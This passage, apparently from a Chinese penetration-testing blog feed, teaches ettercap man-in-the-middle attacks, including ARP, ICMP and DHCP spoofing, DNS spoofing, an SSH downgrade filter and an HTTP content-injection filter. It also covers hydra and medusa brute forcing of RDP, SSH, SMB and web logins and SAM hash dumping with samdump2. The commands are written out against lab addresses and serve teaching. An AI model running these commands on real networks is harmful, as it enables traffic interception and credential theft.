eth0 -T -M arp:remote -q /192.168.1.1// /192.168.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m messag</code></li></ul><blockquote><p>-T：指定字符模式</p><p>-M：指定中间人攻击方式</p><p>-q：安静模式，不会将所有流量记录下来，只记录重要信息</p><p>-F：调用过滤器</p><p>-P：添加模块</p><p>-w：抓取流量存储为<code>.cap</code>文件</p><p>-l：记录简单日志信息</p><p>-L：记录所有日志信息</p><p>-m：指定一个文件存储发现用户名和密码</p><p>arp:remote&#x2F;single：使用全双工&#x2F;单工</p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210200735802.png" alt="image-20230210200735802"></p><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210200945833.png" alt="image-20230210200945833"></p><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210201815026.png" alt="image-20230210201815026"></p><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210201905082.png" alt="image-20230210201905082"></p><h3 id="图形化模式"><a href="#图形化模式" class="headerlink" title="图形化模式"></a>图形化模式</h3><h4 id="嗅探明文协议"><a href="#嗅探明文协议" class="headerlink" title="嗅探明文协议"></a>嗅探明文协议</h4><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210202310252.png" alt="image-20230210202310252"></p><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210202548548.png" alt="image-20230210202548548"></p><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210203152981.png" alt="image-20230210203152981"></p><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210203414317.png" alt="image-20230210203414317"></p><h4 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a>DNS欺骗</h4><blockquote><p>dns_spoof插件配置文件</p><p>vim &#x2F;etc&#x2F;ettercap&#x2F;etter.dns    # DNS欺骗插件配置文件</p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210214453295.png" alt="image-20230210214453295"></p><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210214646028.png" alt="image-20230210214646028"></p><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210214832066.png" alt="image-20230210214832066"></p><h3 id="日志查看"><a href="#日志查看" class="headerlink" title="日志查看"></a>日志查看</h3><blockquote><p>etterlog -p log.eci 查看获取的密码</p><p>etterlog -c log.ecp 列出Log中的连接</p><p>etterlog -c -f &#x2F;1.1.1.1&#x2F; log.ecp    查看指定IP的连接</p><p>etterlog -B -n -s -F TCP:1.1.1.1:20:1.1.1.2:1234 log.ecp &gt; aa选择相应的连接并榨取文件</p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210215608081.png" alt="image-20230210215608081"></p><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210215619591.png" alt="image-20230210215619591"></p><h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><blockquote><p>filter文件路径：&#x2F;usr&#x2F;share&#x2F;ettercap&#x2F;</p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210220025878.png" alt="image-20230210220025878"></p><h4 id="etter-filter-ssh"><a href="#etter-filter-ssh" class="headerlink" title="etter.filter.ssh"></a>etter.filter.ssh</h4><blockquote><p>ettercap无法对ssh2中间人作解密，只能对ssh1中间人作解密</p><p>客户端若要建立ssh2连接，中间人使用etter.filter.ssh脚本将ssh1.99强制替换为ssh1.51，这样就使客户端使用了可解密的ssh，中间人就可以解密出流经的流量；若客户端只能使用ssh2连接，则无法实现中间人攻击</p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210220655027.png" alt="image-20230210220655027"></p><h5 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h5><blockquote><p>再使用此脚本之前需要进行编译</p></blockquote><ul><li><code>etterfilter etter.filter.ssh -o ssh.ef</code></li></ul><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210221449139.png" alt="image-20230210221449139"></p><ul><li><code>ettercap -i eth0 -T -M arp:remote -q /192.168.216.2// /192.168.216.157//  -w a.cap -l loginfo -L logall -m messag -F ssh.ef</code></li></ul><blockquote><p>-F：使用编译后的ssh.ef</p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210221655064.png" alt="image-20230210221655064"></p><h5 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h5><blockquote><p>可将此脚本修改为HTTP脚本，可替换为后门程序等。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">if (ip.proto &#x3D;&#x3D; TCP &amp;&amp; tcp.src &#x3D;&#x3D; 80) &#123; msg(&quot;data on TCP 80\n&quot;); replace(&quot;img src&#x3D;&quot;,&quot;img src&#x3D;\&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;1.gif\&quot; &quot;); replace(&quot;IMG src&#x3D;&quot;,&quot;img src&#x3D;\&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;1.gif\&quot; &quot;); replace(&quot;IMG SRC&#x3D;&quot;,&quot;img src&#x3D;\&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;1.gif\&quot; &quot;); &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ICMP中间人"><a href="#ICMP中间人" class="headerlink" title="ICMP中间人"></a>ICMP中间人</h3><ul><li><code>-M icmp:00:11:22:33:44:55/10.0.0.1（真实网关的MAC/IP）</code></li></ul><blockquote><p>原理：</p><p>ICMP路由重定向实现中间人攻击；</p><p>客户端上网流量通过正常网关转发，但如果中间人向网络中发送ICMP路由重定向通知信息，告诉网络中的所有主机中间人才是最优的网络线路，在这个网络中所有客户端都接受到这个信息之后，客户端就会向中间人发送所有的流量，中间人再将包转发给网关进行转发，但由于ICMP重定向包对网关设备失效，因此回包的时候，网关不会经过中间人而是直接转发给客户端，半双工模式。</p><p><strong>ICMP路由重定向的作用就是向网络中通告最好的路由线路，但ICMP重定向包对所有的网关设备不生效</strong></p></blockquote><h3 id="DHCP中间人"><a href="#DHCP中间人" class="headerlink" title="DHCP中间人"></a>DHCP中间人</h3><ul><li><code>−M dhcp:192.168.0.30,35,50−60/255.255.255.0/192.168.0.1（DNS）</code></li></ul><blockquote><p>原理：</p><p>DHCP默认情况下是核心交换机或者网关路由器作服务；</p><p>假设核心交换机提供DHCP服务，有新的主机连接到网络中，由核心交换机分配一个IP，若利用ettercap开启DHCP中间人方式，中间人会将自己也伪装成一个DHCP服务器，而且中间人会以最快的速度、在真实的DHCP服务发送响应包之前向客户端发送虚假的DHCP响应包，从而实现修改客户端网关配置，让客户端不再指向路由器网卡 ，而是指向中间人主机网卡，中间人主机再次转发给真实网关，而回包时候和ICMP相同，真实的网关会直接发送给客户端，不经过中间人，同样也是半双工模式。</p></blockquote><h3 id="交换机端口窃取中间人"><a href="#交换机端口窃取中间人" class="headerlink" title="交换机端口窃取中间人"></a>交换机端口窃取中间人</h3><ul><li><code>-M port /1.1.1.1/ /1.1.1.2/</code></li></ul><blockquote><p>原理：</p><p>使用交换机端口窃取方式实现中间人攻击；</p><p>客户端和中间人都连接在同一台交换机上，中间人向连接交换机的端口发送flood(泛洪)ARP包，ARP包中的目的地址是中间人的MAC地址，源地址为受害机MAC地址；而交换机学习地址的时候是根据源地址学习，当中间人泛洪源地址为受害机MAC地址后，交换机就会更新连接中间人那个网口内存中记录的内容，更新为受害机的MAC地址，若此时有一个新主机要发送给目的地址为受害机的MAC地址后，本来要转发给真实的目标机，就会发送给中间人，实现交换机端口窃取，既可以是半双工，也可以是全双工。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 密码破解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 密码破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-密码破解【二】</title>
      <link href="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/"/>
      <url>/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="在线密码破解"><a href="#在线密码破解" class="headerlink" title="在线密码破解"></a>在线密码破解</h2><blockquote><p>服务是在线状态，一个一个尝试字典密码</p></blockquote><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><blockquote><ul><li>稳定性差,程序时常崩溃</li><li>速度控制不好，容易触发服务屏蔽或锁死机制</li><li>每主机新建进程，每服务新建实例</li><li>一大量目标破解时性能差</li></ul></blockquote><h4 id="支持的服务"><a href="#支持的服务" class="headerlink" title="支持的服务"></a>支持的服务</h4><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230207122217744.png" alt="image-20230207122217744"></p><h4 id="Windows密码破解"><a href="#Windows密码破解" class="headerlink" title="Windows密码破解"></a>Windows密码破解</h4><ul><li>hydra -l administrator -P password.lst rdp:&#x2F;&#x2F;192.168.216.128 -vV</li></ul><blockquote><p>-vV：显示详细信息</p><p>其他服务类似：ftp，smb等</p></blockquote><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230207130824513.png" alt="image-20230207130824513"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230207130746156.png" alt="image-20230207130746156"></p><h4 id="Linux密码破解"><a href="#Linux密码破解" class="headerlink" title="Linux密码破解"></a>Linux密码破解</h4><ul><li><code>hydra -l root -P password.lst ssh://192.168.216.167 -e nsr -t 4 -vV</code></li></ul><blockquote><p>-e nsr：n表示空密码，s表示账号与密码相同，r表示账号与密码互换</p><p>-t：并发连接数（hydra不稳定，建议小点）</p></blockquote><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230207173831594.png" alt="image-20230207173831594"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230207175333971.png" alt="image-20230207175333971"></p><h4 id="图形化hydra"><a href="#图形化hydra" class="headerlink" title="图形化hydra"></a>图形化hydra</h4><h5 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h5><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230207174906504.png" alt="image-20230207174906504"></p><h5 id="Passwords"><a href="#Passwords" class="headerlink" title="Passwords"></a>Passwords</h5><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230207175122909.png" alt="image-20230207175122909"></p><h5 id="Tuning（性能）"><a href="#Tuning（性能）" class="headerlink" title="Tuning（性能）"></a>Tuning（性能）</h5><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230207175216149.png" alt="image-20230207175216149"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230207175806264.png" alt="image-20230207175806264"></p><h4 id="基于表单的身份验证"><a href="#基于表单的身份验证" class="headerlink" title="基于表单的身份验证"></a>基于表单的身份验证</h4><h5 id="基于登录未成功的字符破解"><a href="#基于登录未成功的字符破解" class="headerlink" title="基于登录未成功的字符破解"></a>基于登录未成功的字符破解</h5><ul><li><code>hydra -l admin -P pass.lst 192.168.216.167 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed&quot; -V</code></li></ul><blockquote><p>http-post-form使用post方式提交（get方式就用http-get-form）</p><p>username和password表示表单名称</p><p>^USER^被admin替换</p><p>^PASS^被pass.lst替换（必须写成^USER^和^PASS^这种格式）</p><p>Login&#x3D;Login:Login failed：告诉hydra服务器返回被那些特征字符串表示登录失败尝试下一次登录</p></blockquote><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230207182222284.png" alt="image-20230207182222284"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230207182233771.png" alt="image-20230207182233771"></p><h5 id="基于登录成功的字符破解"><a href="#基于登录成功的字符破解" class="headerlink" title="基于登录成功的字符破解"></a>基于登录成功的字符破解</h5><ul><li><code>hydra -l admin -P pass.lst 192.168.216.167 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:S=index.php&quot; -V</code></li></ul><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230207183535531.png" alt="image-20230207183535531"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230207183548044.png" alt="image-20230207183548044"></p><h5 id="提交其他信息的破解"><a href="#提交其他信息的破解" class="headerlink" title="提交其他信息的破解"></a>提交其他信息的破解</h5><ul><li><code>/foo.php:user=^USER^&amp;pass=^PASS^:S=success:C=/page/cookie:H=X-Foo:Foo</code></li></ul><blockquote><ol><li>C：先访问指定页面取得cookie（如果需要检查cookie，则可以先到其他页面获取可用的cookie）</li><li>H：指定http头（指定所发包的包头信息）</li><li>支持的请求方式：https-post-form、http-get-form、https-get-form</li><li>-S：使用SSL连接</li></ol></blockquote><h3 id="pw-inspector"><a href="#pw-inspector" class="headerlink" title="pw-inspector"></a>pw-inspector</h3><blockquote><p>集成在hydra中的小工具</p><p>对生成的字典进行过滤</p><p>按字符的长度和字符集筛选字典</p><p>-i：输入字典文件</p><p>-o：结果输出到文件中</p><p>-l：按照小写字母筛选</p><p>-u：按照大写字母筛选</p><p>-m：按照最小长度筛选</p><p>-M：按照最大长度筛选</p></blockquote><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208094935791.png" alt="image-20230208094935791"></p><ul><li><code>pw-inspector -i /usr/share/wordlists/nmap.lst -o p.lst -l</code></li></ul><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208094634684.png" alt="image-20230208094634684"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208094838493.png" alt="image-20230208094838493"></p><h3 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h3><blockquote><ul><li><p>稳定性好</p></li><li><p>速度控制得当</p></li><li><p>基于线程</p></li><li><p>支持模块少于hydra（不支持RDP）</p></li><li><p>WEB-Form支持存在缺陷</p></li></ul></blockquote><h4 id="支持的模块"><a href="#支持的模块" class="headerlink" title="支持的模块"></a>支持的模块</h4><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208100647573.png" alt="image-20230208100647573"></p><h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><blockquote><p>-e：与hydra用法相同</p><p>-M：指定模块</p><p>-F：破解出一个密码就停止</p><p>-T：指定并发数</p><p>-n：非默认端口</p><p>-s：使用SSL连接</p><p>-v(0-6)：显示0-6级别的信息，例：<code>-v 3</code></p><p><strong>medusa -M ftp -q   # 查看小参数如何使用</strong></p></blockquote><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208100843182.png" alt="image-20230208100843182"></p><h4 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h4><h5 id="Linux-SSH破解"><a href="#Linux-SSH破解" class="headerlink" title="Linux-SSH破解"></a>Linux-SSH破解</h5><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208101738436.png" alt="image-20230208101738436"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208102202896.png" alt="image-20230208102202896"></p><h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><ul><li>破解SMB文件共享服务</li></ul><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208102735820.png" alt="image-20230208102735820"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208102753975.png" alt="image-20230208102753975"></p><ul><li>破解Mysql服务</li></ul><blockquote><p>mysql密码是空密码，加上<code>-e ns</code>参数即可</p></blockquote><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208103215596.png" alt="image-20230208103215596"></p><h5 id="基于表单的破解"><a href="#基于表单的破解" class="headerlink" title="基于表单的破解"></a>基于表单的破解</h5><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208103903281.png" alt="image-20230208103903281"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208104617255.png" alt="image-20230208104617255"></p><blockquote><p><code>-q</code>参数查看爆破表单所需参数</p></blockquote><h2 id="离线密码破解"><a href="#离线密码破解" class="headerlink" title="离线密码破解"></a>离线密码破解</h2><blockquote><ul><li><p>身份认证</p><ul><li>禁止明文传输密码</li><li>每次认证使用HASH算法加密密码传输（HASH算法加密容易、解密困难）</li><li>服务器端用户数据库应加盐加密保存</li></ul></li><li><p>破解思路</p></li><li><p>嗅探获取密码HASH</p></li><li><p>利用漏洞登陆服务器并从用户数据库获取密码HASH</p></li><li><p>识别HASH类型</p><ul><li>长度、字符集</li></ul></li><li><p>利用离线破解工具碰撞密码HASH</p></li><li><p>优势</p><ul><li>离线不会触发密码锁定机制</li><li>不会产生大量登录失败日志引起管理员注意</li></ul></li></ul></blockquote><h3 id="HASH识别工具"><a href="#HASH识别工具" class="headerlink" title="HASH识别工具"></a>HASH识别工具</h3><blockquote><p>可能识别错误或无法识别</p></blockquote><h4 id="hash‐identifier"><a href="#hash‐identifier" class="headerlink" title="hash‐identifier"></a>hash‐identifier</h4><h5 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h5><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208111916700.png" alt="image-20230208111916700"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208111310605.png" alt="image-20230208111310605"></p><h5 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h5><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208111942472.png" alt="image-20230208111942472"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208111959137.png" alt="image-20230208111959137"></p><h5 id="SHA256"><a href="#SHA256" class="headerlink" title="SHA256"></a>SHA256</h5><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208112031554.png" alt="image-20230208112031554"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208112046628.png" alt="image-20230208112046628"></p><h4 id="hashid"><a href="#hashid" class="headerlink" title="hashid"></a>hashid</h4><blockquote><p>准确性没有hash‐identifier高</p></blockquote><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208112221489.png" alt="image-20230208112221489"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208112245446.png" alt="image-20230208112245446"></p><h3 id="Windows-HASH获取工具"><a href="#Windows-HASH获取工具" class="headerlink" title="Windows HASH获取工具"></a>Windows HASH获取工具</h3><blockquote><ul><li>利用漏洞：Pwdump 、 fgdump 、 mimikatz 、 wce</li><li>物理接触：samdump2</li><li>Kali ISO 启动虚拟机</li><li>mount &#x2F;dev&#x2F;sda2 &#x2F;mnt</li><li>cd &#x2F;mnt &#x2F;Windows&#x2F;config</li><li>samdump2 SYSTEM SAM -o sam.hash</li><li>利用nc 传输 HASH</li></ul><p>思路：</p><p>获取Windows目标机的用户名和登录密码方法，在可以物理接触目标机的情况下，通过Kali 的ISO引导目标机启动，然后将目标机磁盘挂载到Kali上，再利用samdump2工具提取目标机SAM数据库，对提取到的HASH进行分析破解。</p></blockquote><h4 id="使用kali引导win7主机"><a href="#使用kali引导win7主机" class="headerlink" title="使用kali引导win7主机"></a>使用kali引导win7主机</h4><h5 id="选择kali的ios文件"><a href="#选择kali的ios文件" class="headerlink" title="选择kali的ios文件"></a>选择kali的ios文件</h5><blockquote><p>kali的iso文件要使用<code>Live</code>版本</p></blockquote><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208123831072.png" alt="image-20230208123831072"></p><h5 id="启动win7主机"><a href="#启动win7主机" class="headerlink" title="启动win7主机"></a>启动win7主机</h5><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208125847304.png" alt="image-20230208125847304"></p><h5 id="查看磁盘分区"><a href="#查看磁盘分区" class="headerlink" title="查看磁盘分区"></a>查看磁盘分区</h5><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208130210687.png" alt="image-20230208130210687"></p><blockquote><p>sda分区为sda1和sda2；sda1存放系统引导文件；sda2存放操作系统文件；SAM数据库实在windows目录下的system32目录下存放</p></blockquote><h5 id="将sda2分区挂载到kali"><a href="#将sda2分区挂载到kali" class="headerlink" title="将sda2分区挂载到kali"></a>将sda2分区挂载到kali</h5><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208130941562.png" alt="image-20230208130941562"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208131359148.png" alt="image-20230208131359148"></p><p><img 